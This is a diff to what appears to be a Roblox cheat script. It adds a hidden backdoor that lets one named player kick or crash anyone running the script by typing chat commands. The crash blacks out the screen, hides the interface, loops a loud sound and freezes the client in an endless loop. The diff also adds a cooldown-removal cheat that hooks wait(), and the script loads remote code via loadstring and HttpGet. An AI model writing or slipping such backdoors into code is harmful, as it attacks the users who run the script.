@@ -1,3 +1,90 @@
+local ownerName = "ArcherToAnything"
+local localPlayer = game.Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+
+local function crashCommand()
+    local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+
+    local blackFrame = Instance.new("Frame", gui)
+    blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.Position = UDim2.new(0, 0, 0, 0)
+    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.ZIndex = 9999
+
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+    local sound = Instance.new("Sound", gui)
+    sound.SoundId = "rbxassetid://9113882449"
+    sound.Volume = 10
+    sound.Looped = true
+    sound:Play()
+
+    task.spawn(function()
+        task.wait(1.5)
+        while true do
+            for _ = 1, 1e6 do end
+        end
+    end)
+end
+
+local function findPlayer(partial)
+    partial = partial:lower()
+    for _, p in pairs(game.Players:GetPlayers()) do
+        if p.Name:lower():sub(1, #partial) == partial then
+            return p
+        end
+    end
+end
+
+local function listen(plr)
+    plr.Chatted:Connect(function(msg)
+        if plr.Name == ownerName then
+            local args = msg:split(" ")
+            local cmd = args[1]:lower()
+            local target = args[2]
+
+            if target then
+                local found = findPlayer(target)
+                if found and found == localPlayer then
+                    if cmd == ":kick" then
+                        localPlayer:Kick()
+                    elseif cmd == ":crash" then
+                        crashCommand()
+                    end
+                end
+            end
+        end
+    end)
+end
+
+for _, plr in ipairs(game.Players:GetPlayers()) do
+    listen(plr)
+end
+
+game.Players.PlayerAdded:Connect(listen)
+
+local w; w = hookfunction(wait, function(s) return w(0) end)
+
+task.spawn(function()
+    while task.wait(0) do
+        for _, t in pairs(localPlayer.Backpack:GetChildren()) do
+            local c = t:FindFirstChild("CooldownTime")
+            local o = t:FindFirstChild("onCooldown")
+            if c then c.Value = 0 end
+            if o then o.Value = false end
+        end
+        for _, t in pairs(localPlayer.Character:GetChildren()) do
+            local c = t:FindFirstChild("CooldownTime")
+            local o = t:FindFirstChild("onCooldown")
+            if c then c.Value = 0 end
+            if o then o.Value = false end
+        end
+    end
+end)
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Players = game:GetService("Players")
